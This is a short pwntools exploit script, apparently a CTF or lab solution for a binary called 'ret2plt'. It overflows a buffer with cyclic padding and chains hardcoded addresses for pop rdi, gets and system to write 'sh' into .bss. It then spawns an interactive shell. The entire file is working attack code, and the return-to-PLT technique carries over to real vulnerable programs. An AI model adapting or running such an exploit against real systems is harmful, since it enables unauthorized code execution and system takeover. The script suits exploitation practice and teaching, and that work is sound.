#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./ret2plt')
# pause()

system = 0x400520
gets = 0x400530
pop_rdi = 0x400733

bss = 0x601040

payload = flat(
    cyclic(0x38),
    pop_rdi,
    bss,
    gets,
    pop_rdi,
    bss,
    system
)


p.sendlineafter('D', payload)

p.sendline('sh')

p.interactive()
p.close()
